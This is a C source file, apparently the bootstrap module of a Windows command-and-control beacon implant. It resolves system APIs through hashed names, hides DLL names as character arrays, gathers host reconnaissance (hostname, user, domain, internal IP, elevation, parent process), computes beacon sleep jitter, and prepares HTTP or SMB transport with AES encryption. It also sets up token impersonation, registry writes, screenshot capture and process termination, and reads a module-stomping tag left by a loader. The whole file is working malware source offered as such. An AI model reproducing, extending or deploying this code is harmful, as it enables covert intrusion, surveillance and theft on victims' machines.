/* beacon/src/Core/Bootstrap.c
 * NaxBootstrap - resolve all APIs and allocate NAX_INSTANCE on the heap.
 * NaxEffectiveSleep - jitter calculation.
 * NaxGetInternalIp, NaxGetDomain - system info helpers. */

#include "Nax.h"
#include "Config.h"
#include "Transport.h"
#include <winternl.h>
#include <iphlpapi.h>

/* ========= [ jitter ] ========= */

FUNC UINT32 NaxEffectiveSleep( PNAX_INSTANCE Nax ) {
    if ( Nax->Config.JitterPct == 0 )
        return Nax->Config.SleepMs;
    UINT32 delta = ( Nax->Config.SleepMs / 100u ) * (UINT32)Nax->Config.JitterPct;
    if ( delta == 0 )
        return Nax->Config.SleepMs;
    BYTE r = 0;
    Nax->Bcrypt.BCryptGenRandom( NULL, &r, 1, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
    INT32 off = (INT32)( (UINT32)r % ( 2u * delta + 1u ) ) - (INT32)( delta );
    INT32 val = (INT32)( Nax->Config.SleepMs ) + off;
    return (UINT32)( val < 0 ? 0 : val );
}

/* ========= [ internal IP helper ] ========= */

FUNC VOID NaxGetInternalIp( PNAX_INSTANCE Nax, PCHAR out, UINT32 cap ) {
    CHAR def[] = { '0', '.', '0', '.', '0', '.', '0', '\0' };
    MmCopy( out, def, 8 );

    if ( !Nax->Iphlpapi.GetAdaptersInfo )
        return;

    ULONG adapterInfoBufLen = 0;
    if ( Nax->Iphlpapi.GetAdaptersInfo( NULL, &adapterInfoBufLen ) != ERROR_BUFFER_OVERFLOW )
        return;

    PIP_ADAPTER_INFO adapterInfo = (PIP_ADAPTER_INFO) Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, adapterInfoBufLen );
    if ( ! adapterInfo )
        return;

    if ( Nax->Iphlpapi.GetAdaptersInfo( adapterInfo, &adapterInfoBufLen ) == ERROR_SUCCESS ) {
        for ( PIP_ADAPTER_INFO a = adapterInfo; a; a = a->Next ) {
            if ( a->Type == NAX_MIB_IF_TYPE_LOOPBACK )
                continue;
            PCHAR ip = a->IpAddressList.IpAddress.String;
            if ( ip[0] == '0' && ip[1] == '.' )
                continue;
            if ( ip[0] == '1' && ip[1] == '6' && ip[2] == '9' && ip[3] == '.' &&
                 ip[4] == '2' && ip[5] == '5' && ip[6] == '4' && ip[7] == '.' )
                continue;
            UINT32 j = 0;
            while ( ip[j] && j < cap - 1 ) {
                out[j] = ip[j];
                j++;
            }
            out[j] = '\0';
            break;
        }
    }
    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, adapterInfo );
}

/* ========= [ domain helper ] ========= */

FUNC VOID NaxGetDomain( PNAX_INSTANCE Nax, PCHAR out, UINT32 cap ) {
    WCHAR wbuf[256];
    MmZero( wbuf, sizeof( wbuf ) );
    DWORD wlen = 256;
    if ( Nax->Kernel32.GetComputerNameExW( ComputerNameDnsDomain, wbuf, &wlen ) && wlen > 0 ) {
        INT n = Nax->Kernel32.WideCharToMultiByte( CP_UTF8, 0, wbuf, -1, out, (INT)cap, NULL, NULL );
        if ( n > 0 )
            return;
    }
    CHAR wg[] = { 'W', 'O', 'R', 'K', 'G', 'R', 'O', 'U', 'P', '\0' };
    MmCopy( out, wg, 10 );
}

/* ========= [ system info gather ] ========= */

FUNC VOID NaxGatherSysInfo( PNAX_INSTANCE Nax, PNAX_SYSINFO info ) {
    MmZero( info, sizeof( NAX_SYSINFO ) );

    { WCHAR w[64]; DWORD n = 64;
      if ( Nax->Kernel32.GetComputerNameExW( ComputerNameDnsHostname, w, &n ) )
          Nax->Kernel32.WideCharToMultiByte( CP_UTF8, 0, w, -1, info->Hostname, 64, NULL, NULL ); }

    { WCHAR w[256]; DWORD n = 256;
      if ( Nax->Advapi32.GetUserNameW( w, &n ) )
          Nax->Kernel32.WideCharToMultiByte( CP_UTF8, 0, w, -1, info->Username, 256, NULL, NULL ); }

    { MmZero( Nax->ImgPath, 260 );
      PNAX_RTL_USER_PROCESS_PARAMETERS pp = NaxCurrentPeb()->ProcessParameters;
      PWSTR  img_buf   = pp->ImagePathName.Buffer;
      UINT32 img_chars = (UINT32)pp->ImagePathName.Length / 2;
      Nax->Kernel32.WideCharToMultiByte( CP_UTF8, 0, img_buf, (INT)img_chars, Nax->ImgPath, 259, NULL, NULL );
      PWSTR  base = img_buf;
      for ( UINT32 i = 0; i < img_chars; i++ )
          if ( img_buf[i] == L'\\' ) base = img_buf + i + 1;
      UINT32 base_chars = img_chars - (UINT32)( base - img_buf );
      Nax->Kernel32.WideCharToMultiByte( CP_UTF8, 0, base, (INT)base_chars, info->Procname, 255, NULL, NULL ); }

    info->Pid = (UINT32)(UINT_PTR)NaxCurrentTeb()->ClientId.UniqueProcess;
    info->Tid = (UINT32)(UINT_PTR)NaxCurrentTeb()->ClientId.UniqueThread;

    { PBYTE peb = (PBYTE)NaxCurrentPeb();
      Nax->OsMajor = *(UINT32*)( peb + NAX_PEB_OSMAJOR_OFFSET );
      Nax->OsMinor = *(UINT32*)( peb + NAX_PEB_OSMINOR_OFFSET );
      Nax->OsBuild = *(UINT16*)( peb + NAX_PEB_OSBUILD_OFFSET ); }

    { PROCESS_BASIC_INFORMATION pbi;
      MmZero( &pbi, sizeof( pbi ) );
      if ( Nax->Ntdll.NtQueryInformationProcess )
          Nax->Ntdll.NtQueryInformationProcess( NtCurrentProcess(), ProcessBasicInformation, &pbi, sizeof( pbi ), NULL );
      Nax->ParentPid = (UINT32)(UINT_PTR)pbi.InheritedFromUniqueProcessId; }

    { Nax->Elevated = 0;
      HANDLE hToken = NULL;
      if ( Nax->Ntdll.NtOpenProcessToken && Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), NAX_TOKEN_QUERY, &hToken ) == 0 ) {
          struct { DWORD TokenIsElevated; } elev;
          ULONG ret = 0;
          if ( Nax->Ntdll.NtQueryInformationToken( hToken, NAX_TOKEN_ELEVATION_TYPE, &elev, sizeof( elev ), &ret ) == 0 )
              Nax->Elevated = elev.TokenIsElevated ? 1 : 0;
          Nax->Ntdll.NtClose( hToken );
      } }

    Nax->Acp   = Nax->Kernel32.GetACP   ? (UINT32)Nax->Kernel32.GetACP()   : 0;
    Nax->OemCp = Nax->Kernel32.GetOEMCP ? (UINT32)Nax->Kernel32.GetOEMCP() : 0;

    NaxGetInternalIp( Nax, info->IpStr, 64 );
    NaxGetDomain( Nax, info->Domain, 256 );

    info->HnLen = 0; while ( info->Hostname[info->HnLen] ) info->HnLen++;
    info->UnLen = 0; while ( info->Username[info->UnLen] ) info->UnLen++;
    info->IpLen = 0; while ( info->IpStr[info->IpLen]    ) info->IpLen++;
    info->DmLen = 0; while ( info->Domain[info->DmLen]   ) info->DmLen++;
    info->PnLen = 0; while ( info->Procname[info->PnLen] ) info->PnLen++;
    info->ImLen = 0; while ( Nax->ImgPath[info->ImLen]   ) info->ImLen++;

    NaxDbg( Nax, "host=%s user=%s proc=%s ip=%s pid=%u tid=%u elevated=%u os=%u.%u.%u ppid=%u acp=%u",
            info->Hostname, info->Username, info->Procname, info->IpStr, info->Pid, info->Tid,
            (UINT32)Nax->Elevated, Nax->OsMajor, Nax->OsMinor, Nax->OsBuild, Nax->ParentPid, Nax->Acp );
}

/* ========= [ instance bootstrap ] ========= */

FUNC PNAX_INSTANCE NaxBootstrap( VOID ) {
    HMODULE hNtdll = NaxGetModule( H_NTDLL_DLL );
    if ( ! hNtdll ) return NULL;

    PVOID pAlloc = NaxGetProc( hNtdll, H_RTLALLOCATEHEAP );
    if ( ! pAlloc ) return NULL;
    __typeof__( RtlAllocateHeap )* fnRtlAllocateHeap = (__typeof__( RtlAllocateHeap )*)pAlloc;

    HANDLE        heap = NaxGetProcessHeap();
    PNAX_INSTANCE Nax  = (PNAX_INSTANCE)fnRtlAllocateHeap( heap, 0, sizeof( NAX_INSTANCE ) );
    if ( ! Nax ) return NULL;
    MmZero( Nax, sizeof( NAX_INSTANCE ) );
    Nax->Magic                   = NAX_INSTANCE_MAGIC;

    Nax->Heap                    = heap;
    Nax->Ntdll.Handle            = hNtdll;
    Nax->Ntdll.RtlAllocateHeap  = (PVOID)pAlloc;
    Nax->Ntdll.RtlFreeHeap      = (PVOID)NaxGetProc( hNtdll, H_RTLFREEHEAP );
    Nax->Ntdll.DbgPrint         = (PVOID)NaxGetProc( hNtdll, H_DBGPRINT );

    Nax->Ntdll.RtlExitUserThread         = (PVOID)NaxGetProc( hNtdll, H_RTLEXITUSERTHREAD );
    Nax->Ntdll.NtAllocateVirtualMemory   = (PVOID)NaxGetProc( hNtdll, H_NTALLOCATEVIRTUALMEMORY );
    Nax->Ntdll.NtProtectVirtualMemory    = (PVOID)NaxGetProc( hNtdll, H_NTPROTECTVIRTUALMEMORY );
    Nax->Ntdll.NtFreeVirtualMemory       = (PVOID)NaxGetProc( hNtdll, H_NTFREEVIRTUALMEMORY );
    Nax->Ntdll.RtlAddFunctionTable       = (PVOID)NaxGetProc( hNtdll, H_RTLADDFUNCTIONTABLE );
    Nax->Ntdll.RtlDeleteFunctionTable    = (PVOID)NaxGetProc( hNtdll, H_RTLDELETEFUNCTIONTABLE );
    Nax->Ntdll._vsnprintf                = (PVOID)NaxGetProc( hNtdll, H__VSNPRINTF );
    Nax->Ntdll.NtOpenProcessToken        = (PVOID)NaxGetProc( hNtdll, H_NTOPENPROCESSTOKEN );
    Nax->Ntdll.NtQueryInformationToken   = (PVOID)NaxGetProc( hNtdll, H_NTQUERYINFORMATIONTOKEN );
    Nax->Ntdll.NtQueryInformationProcess = (PVOID)NaxGetProc( hNtdll, H_NTQUERYINFORMATIONPROCESS );
    Nax->Ntdll.NtSetInformationProcess   = (PVOID)NaxGetProc( hNtdll, H_NTSETINFORMATIONPROCESS );
    Nax->Ntdll.NtClose                   = (PVOID)NaxGetProc( hNtdll, H_NTCLOSE );
    Nax->Ntdll.NtQuerySystemInformation  = (PVOID)NaxGetProc( hNtdll, H_NTQUERYSYSTEMINFORMATION );
    Nax->Ntdll.NtQueryVirtualMemory      = (PVOID)NaxGetProc( hNtdll, H_NTQUERYVIRTUALMEMORY );
    Nax->Ntdll.NtOpenProcess             = (PVOID)NaxGetProc( hNtdll, H_NTOPENPROCESS );
    Nax->Ntdll.NtTerminateProcess        = (PVOID)NaxGetProc( hNtdll, H_NTTERMINATEPROCESS );

    Nax->Ntdll.TpAllocWork                    = (PVOID)NaxGetProc( hNtdll, H_TPALLOCWORK );
    Nax->Ntdll.TpPostWork                     = (PVOID)NaxGetProc( hNtdll, H_TPPOSTWORK );
    Nax->Ntdll.TpReleaseWork                  = (PVOID)NaxGetProc( hNtdll, H_TPRELEASEWORK );
    Nax->Ntdll.RtlInitializeCriticalSection   = (PVOID)NaxGetProc( hNtdll, H_RTLINITIALIZECRITICALSECTION );
    Nax->Ntdll.RtlEnterCriticalSection        = (PVOID)NaxGetProc( hNtdll, H_RTLENTERCRITICALSECTION );
    Nax->Ntdll.RtlLeaveCriticalSection        = (PVOID)NaxGetProc( hNtdll, H_RTLLEAVECRITICALSECTION );
    Nax->Ntdll.RtlTryEnterCriticalSection     = (PVOID)NaxGetProc( hNtdll, H_RTLTRYENTERCRITICALSECTION );
    Nax->Ntdll.RtlDeleteCriticalSection       = (PVOID)NaxGetProc( hNtdll, H_RTLDELETECRITICALSECTION );
    Nax->Ntdll.LdrRegisterDllNotification    = (PVOID)NaxGetProc( hNtdll, H_LDRREGISTERDLLNOTIFICATION );
    Nax->Ntdll.LdrUnregisterDllNotification  = (PVOID)NaxGetProc( hNtdll, H_LDRUNREGISTERDLLNOTIFICATION );

    NaxDbgx( Nax, "bootstrap: heap=%p Nax=%p", (PVOID)heap, (PVOID)Nax );

    NaxInitConfig( Nax );
    NaxDbgx( Nax, "config: sleep=%u jitter=%u", Nax->Config.SleepMs, (UINT32)Nax->Config.JitterPct );

    HMODULE hK32 = NaxGetModule( H_KERNEL32_DLL );
    NaxDbgx( Nax, "kernel32: %p", hK32 );
    if ( ! hK32 ) {
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, Nax );
        return NULL;
    }
    Nax->Kernel32.Handle                    = hK32;
    Nax->Kernel32.GetComputerNameExW         = (PVOID)NaxGetProc( hK32, H_GETCOMPUTERNAMEEXW );
    Nax->Kernel32.ExitProcess               = (PVOID)NaxGetProc( hK32, H_EXITPROCESS );
    Nax->Kernel32.Sleep                     = (PVOID)NaxGetProc( hK32, H_SLEEP );
    Nax->Kernel32.LoadLibraryW              = (PVOID)NaxGetProc( hK32, H_LOADLIBRARYW );
    Nax->Kernel32.WideCharToMultiByte        = (PVOID)NaxGetProc( hK32, H_WIDECHARTOMULTIBYTE );
    Nax->Kernel32.MultiByteToWideChar        = (PVOID)NaxGetProc( hK32, H_MULTIBYTETOWIDECHAR );
    Nax->Kernel32.GlobalFree               = (PVOID)NaxGetProc( hK32, H_GLOBALFREE );
    Nax->Kernel32.CreateDirectoryA                = (PVOID)NaxGetProc( hK32, H_CREATEDIRECTORYA );
    Nax->Kernel32.SetCurrentDirectoryA            = (PVOID)NaxGetProc( hK32, H_SETCURRENTDIRECTORYA );
    Nax->Kernel32.GetCurrentDirectoryA            = (PVOID)NaxGetProc( hK32, H_GETCURRENTDIRECTORYA );
    Nax->Kernel32.CreateFileA                     = (PVOID)NaxGetProc( hK32, H_CREATEFILEA );
    Nax->Kernel32.ReadFile                        = (PVOID)NaxGetProc( hK32, H_READFILE );
    Nax->Kernel32.WriteFile                       = (PVOID)NaxGetProc( hK32, H_WRITEFILE );
    Nax->Kernel32.DeleteFileA                     = (PVOID)NaxGetProc( hK32, H_DELETEFILEA );
    Nax->Kernel32.CopyFileA                       = (PVOID)NaxGetProc( hK32, H_COPYFILEA );
    Nax->Kernel32.MoveFileExA                     = (PVOID)NaxGetProc( hK32, H_MOVEFILEEXA );
    Nax->Kernel32.CloseHandle                     = (PVOID)NaxGetProc( hK32, H_CLOSEHANDLE );
    Nax->Kernel32.RemoveDirectoryA                = (PVOID)NaxGetProc( hK32, H_REMOVEDIRECTORYA );
    Nax->Kernel32.HeapCreate                     = (PVOID)NaxGetProc( hK32, H_HEAPCREATE );
    Nax->Kernel32.HeapDestroy                    = (PVOID)NaxGetProc( hK32, H_HEAPDESTROY );
    Nax->Kernel32.FindFirstFileA                  = (PVOID)NaxGetProc( hK32, H_FINDFIRSTFILEA );
    Nax->Kernel32.FindNextFileA                   = (PVOID)NaxGetProc( hK32, H_FINDNEXTFILEA );
    Nax->Kernel32.FindClose                       = (PVOID)NaxGetProc( hK32, H_FINDCLOSE );
    Nax->Kernel32.LoadLibraryA              = (PVOID)NaxGetProc( hK32, H_LOADLIBRARYA );
    Nax->Kernel32.GetProcAddress            = (PVOID)NaxGetProc( hK32, H_GETPROCADDRESS );
    Nax->Kernel32.GetModuleHandleA          = (PVOID)NaxGetProc( hK32, H_GETMODULEHANDLEA );
    Nax->Kernel32.FreeLibrary               = (PVOID)NaxGetProc( hK32, H_FREELIBRARY );
    Nax->Kernel32.LoadLibraryExW            = (PVOID)NaxGetProc( hK32, H_LOADLIBRARYEXW );
    Nax->Kernel32.VirtualProtect            = (PVOID)NaxGetProc( hK32, H_VIRTUALPROTECT );
    Nax->Kernel32.GetFileSize                     = (PVOID)NaxGetProc( hK32, H_GETFILESIZE );
    Nax->Kernel32.GetLastError                    = (PVOID)NaxGetProc( hK32, H_GETLASTERROR );
    Nax->Kernel32.CreateProcessA                   = (PVOID)NaxGetProc( hK32, H_CREATEPROCESSA );
    Nax->Kernel32.CreatePipe                       = (PVOID)NaxGetProc( hK32, H_CREATEPIPE );
    Nax->Kernel32.WaitForSingleObject              = (PVOID)NaxGetProc( hK32, H_WAITFORSINGLEOBJECT );
    Nax->Kernel32.WaitForMultipleObjects           = (PVOID)NaxGetProc( hK32, H_WAITFORMULTIPLEOBJECTS );
    Nax->Kernel32.PeekNamedPipe                    = (PVOID)NaxGetProc( hK32, H_PEEKNAMEDPIPE );
    Nax->Kernel32.CreateNamedPipeA                 = (PVOID)NaxGetProc( hK32, H_CREATENAMEDPIPEA );
    Nax->Kernel32.ConnectNamedPipe                 = (PVOID)NaxGetProc( hK32, H_CONNECTNAMEDPIPE );
    Nax->Kernel32.DisconnectNamedPipe              = (PVOID)NaxGetProc( hK32, H_DISCONNECTNAMEDPIPE );
    Nax->Kernel32.SetNamedPipeHandleState          = (PVOID)NaxGetProc( hK32, H_SETNAMEDPIPEHANDLESTATE );
    Nax->Kernel32.CreateEventA                     = (PVOID)NaxGetProc( hK32, H_CREATEEVENTA );
    Nax->Kernel32.SetEvent                         = (PVOID)NaxGetProc( hK32, H_SETEVENT );
    Nax->Kernel32.ResetEvent                       = (PVOID)NaxGetProc( hK32, H_RESETEVENT );
    Nax->Kernel32.GetOverlappedResult              = (PVOID)NaxGetProc( hK32, H_GETOVERLAPPEDRESULT );
    Nax->Kernel32.CancelIo                         = (PVOID)NaxGetProc( hK32, H_CANCELIO );
    Nax->Kernel32.FlushFileBuffers                 = (PVOID)NaxGetProc( hK32, H_FLUSHFILEBUFFERS );
    Nax->Kernel32.GetACP                          = (PVOID)NaxGetProc( hK32, H_GETACP );
    Nax->Kernel32.GetOEMCP                        = (PVOID)NaxGetProc( hK32, H_GETOEMCP );

    Nax->Kernel32.CreateThread               = (PVOID)NaxGetProc( hK32, H_CREATETHREAD );
    Nax->Kernel32.TerminateThread            = (PVOID)NaxGetProc( hK32, H_TERMINATETHREAD );
    Nax->Kernel32.GetTickCount64             = (PVOID)NaxGetProc( hK32, H_GETTICKCOUNT64 );
    Nax->Kernel32.GetCurrentThread           = (PVOID)NaxGetProc( hK32, H_GETCURRENTTHREAD );
    Nax->Kernel32.DuplicateHandle            = (PVOID)NaxGetProc( hK32, H_DUPLICATEHANDLE );
    Nax->Kernel32.GetCurrentProcess          = (PVOID)NaxGetProc( hK32, H_GETCURRENTPROCESS );

    Nax->Kernel32.GetProcessMitigationPolicy = (PVOID)NaxGetProc( hK32, H_GETPROCESSMITIGATIONPOLICY );
    Nax->Kernel32.SetFileAttributesA         = (PVOID)NaxGetProc( hK32, H_SETFILEATTRIBUTESA );

    if ( Nax->Kernel32.HeapCreate ) {
        HANDLE priv = Nax->Kernel32.HeapCreate( 0, 0, 0 );
        if ( priv ) Nax->Heap = priv;
    }
    NaxDbgx( Nax, "beacon private heap: %p", Nax->Heap );

    HMODULE hKB = NaxGetModule( H_KERNELBASE_DLL );
    if ( hKB )
        Nax->Kernelbase.SetProcessValidCallTargets = (PVOID)NaxGetProc( hKB, H_SETPROCESSVALIDCALLTARGETS );

    NaxCfgInit( Nax );

    Nax->JobWakeEvent = Nax->Kernel32.CreateEventA( NULL, TRUE, FALSE, NULL );

    WCHAR msv[] = { 'm', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', '\0' };
    HMODULE hMsvcrt = Nax->Kernel32.LoadLibraryW( msv );
    if ( ! hMsvcrt ) {
        Nax->Ntdll.RtlFreeHeap( heap, 0, Nax );
        return NULL;
    }
    Nax->Msvcrt.printf = (PVOID)NaxGetProc( hMsvcrt, H_PRINTF );

    /* - bcrypt (both HTTP and SMB need AES) - */
    WCHAR bcry[] = { 'b', 'c', 'r', 'y', 'p', 't', '.', 'd', 'l', 'l', '\0' };
    HMODULE hBcrypt = Nax->Kernel32.LoadLibraryW( bcry );
    if ( ! hBcrypt ) {
        Nax->Ntdll.RtlFreeHeap( heap, 0, Nax );
        return NULL;
    }

    Nax->Bcrypt.BCryptOpenAlgorithmProvider  = (PVOID)NaxGetProc( hBcrypt, H_BCRYPTOPENALGORITHMPROVIDER );
    Nax->Bcrypt.BCryptSetProperty            = (PVOID)NaxGetProc( hBcrypt, H_BCRYPTSETPROPERTY );
    Nax->Bcrypt.BCryptGenerateSymmetricKey   = (PVOID)NaxGetProc( hBcrypt, H_BCRYPTGENERATESYMMETRICKEY );
    Nax->Bcrypt.BCryptEncrypt                = (PVOID)NaxGetProc( hBcrypt, H_BCRYPTENCRYPT );
    Nax->Bcrypt.BCryptDecrypt                = (PVOID)NaxGetProc( hBcrypt, H_BCRYPTDECRYPT );
    Nax->Bcrypt.BCryptDestroyKey             = (PVOID)NaxGetProc( hBcrypt, H_BCRYPTDESTROYKEY );
    Nax->Bcrypt.BCryptCloseAlgorithmProvider = (PVOID)NaxGetProc( hBcrypt, H_BCRYPTCLOSEALGORITHMPROVIDER );
    Nax->Bcrypt.BCryptGenRandom              = (PVOID)NaxGetProc( hBcrypt, H_BCRYPTGENRANDOM );

    /* - iphlpapi (all transports need GetAdaptersInfo for internal IP) - */
    WCHAR iphl[]  = { 'i', 'p', 'h', 'l', 'p', 'a', 'p', 'i', '.', 'd', 'l', 'l', '\0' };
    HMODULE hIphlpapi = Nax->Kernel32.LoadLibraryW( iphl );
    if ( ! hIphlpapi ) {
        Nax->Ntdll.RtlFreeHeap( heap, 0, Nax );
        return NULL;
    }
    Nax->Iphlpapi.GetAdaptersInfo  = (PVOID)NaxGetProc( hIphlpapi, H_GETADAPTERSINFO );

#if NAX_TRANSPORT_PROFILE != NAX_TRANSPORT_SMB
    /* - winhttp (HTTP transport only) - */
    WCHAR whttp[] = { 'w', 'i', 'n', 'h', 't', 't', 'p', '.', 'd', 'l', 'l', '\0' };
    HMODULE hWinhttp  = Nax->Kernel32.LoadLibraryW( whttp );
    NaxDbgx( Nax, "winhttp=%p bcrypt=%p iphlpapi=%p", hWinhttp, hBcrypt, hIphlpapi );
    if ( ! hWinhttp ) {
        Nax->Ntdll.RtlFreeHeap( heap, 0, Nax );
        return NULL;
    }

    Nax->Winhttp.WinHttpOpen                = (PVOID)NaxGetProc( hWinhttp, H_WINHTTPOPEN );
    Nax->Winhttp.WinHttpConnect             = (PVOID)NaxGetProc( hWinhttp, H_WINHTTPCONNECT );
    Nax->Winhttp.WinHttpOpenRequest         = (PVOID)NaxGetProc( hWinhttp, H_WINHTTPOPENREQUEST );
    Nax->Winhttp.WinHttpSendRequest         = (PVOID)NaxGetProc( hWinhttp, H_WINHTTPSENDREQUEST );
    Nax->Winhttp.WinHttpReceiveResponse     = (PVOID)NaxGetProc( hWinhttp, H_WINHTTPRECEIVERESPONSE );
    Nax->Winhttp.WinHttpQueryHeaders        = (PVOID)NaxGetProc( hWinhttp, H_WINHTTPQUERYHEADERS );
    Nax->Winhttp.WinHttpReadData            = (PVOID)NaxGetProc( hWinhttp, H_WINHTTPREADDATA );
    Nax->Winhttp.WinHttpCloseHandle         = (PVOID)NaxGetProc( hWinhttp, H_WINHTTPCLOSEHANDLE );
    Nax->Winhttp.WinHttpCrackUrl            = (PVOID)NaxGetProc( hWinhttp, H_WINHTTPCRACKURL );
    Nax->Winhttp.WinHttpSetOption           = (PVOID)NaxGetProc( hWinhttp, H_WINHTTPSETOPTION );
    Nax->Winhttp.WinHttpQueryOption         = (PVOID)NaxGetProc( hWinhttp, H_WINHTTPQUERYOPTION );
    Nax->Winhttp.WinHttpQueryDataAvailable  = (PVOID)NaxGetProc( hWinhttp, H_WINHTTPQUERYDATAAVAILABLE );
#else
    NaxDbgx( Nax, "SMB transport: skipping winhttp (iphlpapi=%p)", hIphlpapi );
#endif

    WCHAR adv[] = { 'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l', '\0' };
    HMODULE hAdvapi32 = Nax->Kernel32.LoadLibraryW( adv );
    if ( ! hAdvapi32 ) {
        Nax->Ntdll.RtlFreeHeap( heap, 0, Nax );
        return NULL;
    }
    Nax->Advapi32.GetUserNameW                 = (PVOID)NaxGetProc( hAdvapi32, H_GETUSERNAMEW );
    Nax->Advapi32.GetTokenInformation          = (PVOID)NaxGetProc( hAdvapi32, H_GETTOKENINFORMATION );
    Nax->Advapi32.LookupAccountSidA            = (PVOID)NaxGetProc( hAdvapi32, H_LOOKUPACCOUNTSIDA );
    Nax->Advapi32.AllocateAndInitializeSid     = (PVOID)NaxGetProc( hAdvapi32, H_ALLOCATEANDINITIALIZESID );
    Nax->Advapi32.InitializeSecurityDescriptor = (PVOID)NaxGetProc( hAdvapi32, H_INITIALIZESECURITYDESCRIPTOR );
    Nax->Advapi32.SetSecurityDescriptorDacl    = (PVOID)NaxGetProc( hAdvapi32, H_SETSECURITYDESCRIPTORDACL );
    Nax->Advapi32.SetEntriesInAclA             = (PVOID)NaxGetProc( hAdvapi32, H_SETENTRIESINACLA );
    Nax->Advapi32.FreeSid                      = (PVOID)NaxGetProc( hAdvapi32, H_FREESID );
    Nax->Advapi32.DuplicateTokenEx             = (PVOID)NaxGetProc( hAdvapi32, H_DUPLICATETOKENEX );
    Nax->Advapi32.ImpersonateLoggedOnUser      = (PVOID)NaxGetProc( hAdvapi32, H_IMPERSONATELOGGEDONUSER );
    Nax->Advapi32.RevertToSelf                 = (PVOID)NaxGetProc( hAdvapi32, H_REVERTTOSELF );
    Nax->Advapi32.LogonUserA                   = (PVOID)NaxGetProc( hAdvapi32, H_LOGONUSERA );
    Nax->Advapi32.AdjustTokenPrivileges        = (PVOID)NaxGetProc( hAdvapi32, H_ADJUSTTOKENPRIVILEGES );
    Nax->Advapi32.LookupPrivilegeValueA        = (PVOID)NaxGetProc( hAdvapi32, H_LOOKUPPRIVILEGEVALUEA );
    Nax->Advapi32.LookupPrivilegeNameA         = (PVOID)NaxGetProc( hAdvapi32, H_LOOKUPPRIVILEGENAMEA );
    Nax->Advapi32.OpenThreadToken              = (PVOID)NaxGetProc( hAdvapi32, H_OPENTHREADTOKEN );
    Nax->Advapi32.RegCreateKeyExW              = (PVOID)NaxGetProc( hAdvapi32, H_REGCREATEKEYEXW );
    Nax->Advapi32.RegSetValueExW               = (PVOID)NaxGetProc( hAdvapi32, H_REGSETVALUEEXW );
    Nax->Advapi32.RegCloseKey                  = (PVOID)NaxGetProc( hAdvapi32, H_REGCLOSEKEY );
    NaxDbgx( Nax, "advapi32=%p GetUserNameW=%p", hAdvapi32, Nax->Advapi32.GetUserNameW );

    /* - user32 + gdi32 for screenshot - loaded lazily; not fatal if absent - */
    WCHAR user32w[] = { 'u','s','e','r','3','2','.','d','l','l','\0' };
    WCHAR gdi32w[]  = { 'g','d','i','3','2', '.','d','l','l','\0' };
    HMODULE hUser32 = Nax->Kernel32.LoadLibraryW( user32w );
    HMODULE hGdi32  = Nax->Kernel32.LoadLibraryW( gdi32w );
    if ( hUser32 ) {
        Nax->User32.GetSystemMetrics  = (PVOID)NaxGetProc( hUser32, H_GETSYSTEMMETRICS );
        Nax->User32.GetDC             = (PVOID)NaxGetProc( hUser32, H_GETDC );
        Nax->User32.ReleaseDC         = (PVOID)NaxGetProc( hUser32, H_RELEASEDC );
    }
    if ( hGdi32 ) {
        Nax->Gdi32.CreateCompatibleDC      = (PVOID)NaxGetProc( hGdi32, H_CREATECOMPATIBLEDC );
        Nax->Gdi32.CreateCompatibleBitmap  = (PVOID)NaxGetProc( hGdi32, H_CREATECOMPATIBLEBITMAP );
        Nax->Gdi32.SelectObject            = (PVOID)NaxGetProc( hGdi32, H_SELECTOBJECT );
        Nax->Gdi32.BitBlt                  = (PVOID)NaxGetProc( hGdi32, H_BITBLT );
        Nax->Gdi32.GetDIBits               = (PVOID)NaxGetProc( hGdi32, H_GETDIBITS );
        Nax->Gdi32.DeleteObject            = (PVOID)NaxGetProc( hGdi32, H_DELETEOBJECT );
        Nax->Gdi32.DeleteDC               = (PVOID)NaxGetProc( hGdi32, H_DELETEDC );
    }
    NaxDbgx( Nax, "user32=%p gdi32=%p", hUser32, hGdi32 );

    if ( Nax->Ntdll.NtQueryVirtualMemory ) {
        MEMORY_BASIC_INFORMATION mbi;
        MmZero( &mbi, sizeof( mbi ) );
        if ( Nax->Ntdll.NtQueryVirtualMemory( NtCurrentProcess(), (PVOID)NaxBootstrap, 0, &mbi, sizeof( mbi ), NULL ) == 0 ) {
            Nax->SmInfo.BeaconBase = mbi.BaseAddress;
            Nax->SmInfo.BeaconSize = (UINT32)mbi.RegionSize;
            NaxDbgx( Nax, "beacon region: base=%p size=0x%x", Nax->SmInfo.BeaconBase, Nax->SmInfo.BeaconSize );
        }
    }

    /* Read stomp context tag - loader writes { magic, cleanBuf, cleanSize }
     * at (code start + code size), right after the beacon shellcode. */
    {
        extern PVOID StartPtr( void );
        extern PVOID EndPtr( void );
        SIZE_T codeSize = (SIZE_T)( (PBYTE)EndPtr() - (PBYTE)StartPtr() );
        PBYTE  pTag     = (PBYTE)StartPtr() + codeSize;
        NaxDbgx( Nax, "stomp tag: start=%p end=%p codeSize=0x%zx pTag=%p magic=0x%08x",
                 StartPtr(), EndPtr(), codeSize, pTag, *(UINT32*)pTag );
        if ( *(UINT32*)pTag == NAX_STOMP_CTX_MAGIC ) {
            Nax->SmInfo.CleanTextBuf  = *(PVOID*)( pTag + sizeof( UINT32 ) );
            Nax->SmInfo.CleanTextSize = *(UINT32*)( pTag + sizeof( UINT32 ) + sizeof( PVOID ) );
            NaxDbgx( Nax, "clean text: buf=%p size=0x%x", Nax->SmInfo.CleanTextBuf, Nax->SmInfo.CleanTextSize );
        } else {
            NaxDbgx( Nax, "stomp tag NOT FOUND: bytes at pTag: %02x %02x %02x %02x %02x %02x %02x %02x",
                     pTag[0], pTag[1], pTag[2], pTag[3], pTag[4], pTag[5], pTag[6], pTag[7] );
        }
    }

    NaxDbgx( Nax, "bootstrap complete" );
    return Nax;
}
